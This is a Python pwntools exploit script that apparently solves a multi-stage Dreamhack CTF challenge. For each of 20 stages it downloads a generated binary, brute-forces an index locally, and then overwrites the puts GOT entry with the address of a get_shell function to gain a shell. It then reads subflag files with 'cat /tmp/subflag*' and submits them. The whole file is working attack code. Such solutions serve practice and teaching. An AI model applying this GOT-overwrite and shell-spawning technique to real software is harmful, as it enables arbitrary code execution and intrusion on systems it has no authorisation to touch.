from pwn import *
import base64
import os

HOST, PORT = "host3.dreamhack.games", 24503

context.log_level = "info"

LD = "./libc227/lib/x86_64-linux-gnu/ld-2.27.so"
LIBDIR = "./libc227/lib/x86_64-linux-gnu"

EMPTY_LINES_AFTER_EXIT = 2

p = remote(HOST, PORT)
p.sendlineafter(b"? ", b"y")


def run_local(file_name):
    return process([LD, "--library-path", LIBDIR, file_name])


def recv_generated_binary(stage):
    file_name = f"./chall{stage}"

    p.recvuntil(b"----------BINARY(base64encoded)----------\n")
    data_b64 = p.recvuntil(b"---------------", drop=True).strip()
    data = base64.b64decode(data_b64)

    with open(file_name, "wb") as f:
        f.write(data)

    os.chmod(file_name, 0o755)
    return file_name


def idx_candidates(limit=1500):
    yield 0
    for i in range(1, limit + 1):
        yield i
        yield -i


def test_idx(file_name, idx, puts_got, get_shell):
    r = run_local(file_name)

    try:
        r.sendlineafter(b": ", str(idx).encode(), timeout=0.25)
        r.sendlineafter(b": ", p64(puts_got), timeout=0.25)
        r.sendlineafter(b": ", p64(get_shell), timeout=0.25)

        marker = b"PWNED_" + str(idx).encode()
        r.sendline(b"echo " + marker + b"; exit")

        out = r.recvrepeat(timeout=0.4)

        if marker in out:
            return True

        if out == b"":
            return True

    except (EOFError, BrokenPipeError):
        return False

    finally:
        try:
            r.kill()
        except Exception:
            pass
        try:
            r.close()
        except Exception:
            pass

    return False


def find_idx(file_name, elf):
    puts_got = elf.got["puts"]
    get_shell = elf.sym["get_shell"]

    log.info(f"puts@got  = {hex(puts_got)}")
    log.info(f"get_shell = {hex(get_shell)}")

    for idx in idx_candidates(1500):
        if test_idx(file_name, idx, puts_got, get_shell):
            return idx

    return None


for stage in range(20):
    log.info(f"========== Stage {stage} ==========")

    file_name = recv_generated_binary(stage)
    elf = ELF(file_name, checksec=False)

    idx = find_idx(file_name, elf)

    if idx is None:
        log.failure(f"Could not find idx for stage {stage}")
        p.interactive()
        exit()

    log.success(f"stage {stage}: idx = {idx}")

    p.sendlineafter(b": ", str(idx).encode())
    p.sendlineafter(b": ", p64(elf.got["puts"]))
    p.sendlineafter(b": ", p64(elf.sym["get_shell"]))

    p.sendline(b"cat /tmp/subflag*")
    data = p.recvuntil(b"}")
    subflag = data[data.find(b"SUBFLAG{"):]

    log.success(f"subflag = {subflag}")

    p.sendline(b"exit")

    for _ in range(EMPTY_LINES_AFTER_EXIT):
        p.sendline(b"")

    p.sendlineafter(b": ", subflag)

p.interactive()